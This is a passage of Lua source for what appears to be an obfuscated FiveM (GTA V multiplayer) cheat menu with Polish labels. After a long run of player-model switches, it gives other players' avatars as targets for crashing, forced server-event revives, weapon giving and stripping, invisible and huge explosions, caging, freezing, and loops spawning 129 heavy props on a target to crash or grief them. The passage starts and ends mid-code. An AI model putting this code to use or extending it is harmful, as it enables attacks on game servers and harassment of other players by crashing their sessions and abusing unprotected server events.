			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Korean F 02') then
		local model = "A_F_M_KTown_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Korean F 03') then
		local model = "A_F_M_KTown_02"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Korean F 04') then
		local model = "A_F_O_KTown_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Mexican M 01') then
		local model = "A_M_M_MexCntry_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Mexican M 02') then
		local model = "A_M_M_MexLabor_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Mexican M 03') then
		local model = "A_M_Y_MexThug_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Mexican M 04') then
		local model = "G_M_M_MexBoss_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Mexican M 05') then
		local model = "G_M_M_MexBoss_02"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Mexican M 06') then
		local model = "U_M_Y_Mani"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Mexican M 07') then
		local model = "S_M_M_Mariachi_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Mexican F') then
		local model = "U_F_Y_SpyActress"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Mexican HMaid F') then
		local model = "S_F_M_Maid_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Boar') then
		local model = "A_C_Boar"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Pig') then
		local model = "A_C_Pig"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Deer') then
		local model = "A_C_Deer"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Cow') then
				local model = "A_C_Cow"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Chicken') then
		local model = "A_C_Hen"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Hawk') then
		local model = "A_C_Chickenhawk"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Crow') then
		local model = "A_C_Crow"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Monkey') then
		local model = "A_C_Chimp"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Dog Chop') then
		local model = "A_C_Chop"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Dog Husky') then
		local model = "a_c_husky"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Dog Poodle') then
				local model = "a_c_poodle"
					RequestModel(GetHashKey(model)) 
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
					elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Dog Westy') then
						local model = "a_c_westy"
							RequestModel(GetHashKey(model)) 
							Wait(500)
							if HasModelLoaded(GetHashKey(model)) then
								SetPlayerModel(PlayerId(), GetHashKey(model))
						end
					elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Dog Pug') then
						local model = "a_c_pug"
							RequestModel(GetHashKey(model)) 
							Wait(500)
							if HasModelLoaded(GetHashKey(model)) then
								SetPlayerModel(PlayerId(), GetHashKey(model))
						end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Dog Rottweiler') then
		local model = "A_C_Rottweiler"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Dog Shepherd') then
		local model = "A_C_shepherd"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Lion') then
		local model = "A_C_MtLion"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Rat') then
		local model = "A_C_Rat"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Shark') then
		local model = "A_C_SharkTiger"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model Animal~s~ Coyote') then
		local model = "A_C_Coyote"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~g~ Alien') then
		local model = "s_m_m_movalien_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Pongo') then
		local model = "u_m_y_pogo_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ Bartender F') then
		local model = "S_F_Y_Bartender_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
				end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Model~s~ FiveM') then
		local model = "a_m_y_skater_01"
			RequestModel(GetHashKey(model)) 
			Wait(500)
			if HasModelLoaded(GetHashKey(model)) then
				SetPlayerModel(PlayerId(), GetHashKey(model))
			end
			elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('~c~Randomize~s~ Clothing') then
				 SetPedRandomComponentVariation(PlayerPedId(), true)
			end
            
                kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("OnlinePlayersMenu") then
                    for i = 0, 128 do
                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd(GetPlayerName(i).." ID = ["..GetPlayerServerId(i).."] i = ["..i.."] "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~RIP" or "~g~ZYJE"), "PlayerOptionsMenu") then
                            SelectedPlayeriufdhiguodlfgd = i
                        end
                    end

                    kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
                elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("PlayerOptionsMenu") then
                    kaeogkeargmioergoeismgsdfg.SetSubtitleshdkgfjkisdfsdfjkfhgdfgfgfdgkjhdfgfg("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayeriufdhiguodlfgd).."]")
                    if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('Spectate', (Spectating and "~g~[OBSERWUJESZ]")) then
                        SpectatePlayerjkdhfglkidfgdf(SelectedPlayeriufdhiguodlfgd)
					elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Ubierz sie") then
					UbierzSieXD743685345dfjkhlglkffg(SelectedPlayeriufdhiguodlfgd)
                    elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf('Teleportuj') then
                        local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd)), 0.0, 0.0, 0.0, false)
                    elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Crashuj Gracza") then
                        CrashPlayeryigdsifudsgfdgfdlkjhgjdkhdf(GetPlayerPed(SelectedPlayeriufdhiguodlfgd))
                    elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Revnij Gracza", "") then
                        TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(SelectedPlayeriufdhiguodlfgd))
                        TriggerServerEvent('esx_ambulancejob:retestvivee', GetPlayerServerId(SelectedPlayeriufdhiguodlfgd))
                        TriggerServerEvent('esx_ambulancejobb:revive', GetPlayerServerId(SelectedPlayeriufdhiguodlfgd))
                    elseif kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Opcje Trollowania »", "PlayerTrollMenu") then
                    elseif kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Daj bron", "SingleWepPlayer") then
                    elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Daj Amunicje") then
                        for i = 1, #allWeaponsjhsdgfsdfsdf do
                            AddAmmoToPed(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), GetHashKey(allWeaponsjhsdgfsdfsdf[i]), 250)
                        end
                    elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Daj wszystkie Bronie") then
                        for i = 1, #allWeaponsjhsdgfsdfsdf do
                            GiveWeaponToPed(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), GetHashKey(allWeaponsjhsdgfsdfsdf[i]), 1000, false, false)
                        end	
                    elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Usun wszystkie bronie") then
                        for i = 1, #allWeaponsjhsdgfsdfsdf do
                            RemoveAllPedWeapons(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
                        end
                    elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Give Vehicle") then
                        local ped = GetPlayerPed(SelectedPlayeriufdhiguodlfgd)
                        local ModelName = KeyboardInputdfjhfduhifudihdfg("Enter Vehicle Spawn Name", "", 100)
    
                        if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                            RequestModel(ModelName)
                            while not HasModelLoaded(ModelName) do
                                Citizen.Wait(0)
                            end
    
                            local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
                            drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~g~Vehicle Given To Player!")
                        else
                            drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~r~Model is not valid!")
                        end
                    elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Kick From Vehicle") then
                        ClearPedTasksImmediately(GetPlayerPed(SelectedPlayeriufdhiguodlfgd))
                        drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~g~Kicked Player From Vehicle!")
                    elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Delete Vehicle") then
                        DelVehuydfstuisdfdsfjnbmgfdkujihgidf(GetVehiclePedIsUsing(SelectedPlayeriufdhiguodlfgd))
                    elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Spawn Flare On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd))
                        ShootSingleBulletBetweenCoords(coords.x, coords.y , coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_FLAREGUN"), PlayerPedId(), true, true, 100)
                    elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Spawn Smoke On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd))
                        ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_SMOKEGRENADE"), GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true, true, 100)	
                    end
                    
                    
                    kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
                elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("PlayerTrollMenu") then
                    if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Taze Player") then 
					TazeKurwa123786345895734uhidfgdolxsbr7vvtys(SelectedPlayeriufdhiguodlfgd)
					elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("~r~XD ~f~Player") then
					local hashball = "stt_prop_stunt_soccer_ball"
					while not HasModelLoaded(GetHashKey(hashball)) do
						Citizen.Wait(0)
						RequestModel(GetHashKey(hashball))
					end
					local ball = CreateObject(GetHashKey(hashball), 0, 0, 0, true, true, false)
					SetEntityVisible(ball, 0, 0)
					AttachEntityToEntity(ball, GetPlayerPed(SelectedPlayeriufdhiguodlfgd), GetPedBoneIndex(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true)
                    elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Cage Player") then
                        freezePlayerjhfdgsfudgfd = true
                        Citizen.Wait(10)
                        KurwaPropNaTypadfuihgydsioufdsfdsf(GetHashKey("prop_gascage01"))
                        freezePlayerjhfdgsfudgfd = false
                    elseif kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Zramuj gracza autem »", "VehicleRamMenu") then
                    elseif kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Spawnuj propy na graczu »", "SpawnPropsMenu") then
                    elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                        "Freeze Player",
                        freezePlayerjhfdgsfudgfd,
                        function(Enableddsyfusdsdfsdffdkjghdflgf)
                            freezePlayerjhfdgsfudgfd = Enableddsyfusdsdfsdffdkjghdflgf
                        end)
                    then
                    elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Mała niewidzialna eksplozja") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd)), 2, 100000.0, false, true, 0)
                    elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("~b~DUUUUUŻA eksplozja") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd)), 2, 100000.0, true, false, 100000.0)
                    end
                                    
                    kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
                elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("SpawnPropsMenu") then
				if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Drzwi banku", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "p_fin_vaultdoor_s"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Samolot 1", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "p_med_jet_01_s"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Tramwaj", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "p_tram_crash_s"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Skrzynki z bronią", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "hei_prop_carrier_crate_01b"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Billboard", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "prop_billboard_12"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Paleto", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "cs1_lod2_01_7_slod3"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z-5,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Sandy", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "cs4_lod_01_slod3"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z-5,true,true,true)
					end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Dom", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "lf_house_07_"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Wielki ekran", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "prop_big_cin_screen"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Schody", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "prop_bleachers_05_cr"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Podstawka", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "prop_bmu_02_ld"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Pudło", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "prop_box_wood08a"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Koło z drewna", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "prop_cablespool_01b"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					
					end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Łódka", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "prop_can_canoe"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Cement", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "prop_cementbags01"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Drzewko", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "prop_tree_olive_cr2"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Choinka", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "prop_xmas_tree_int"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Cegły 1", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "prop_conc_blocks01a"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Cegły 2", "~r~Native") then
					for i=0, 128 do 
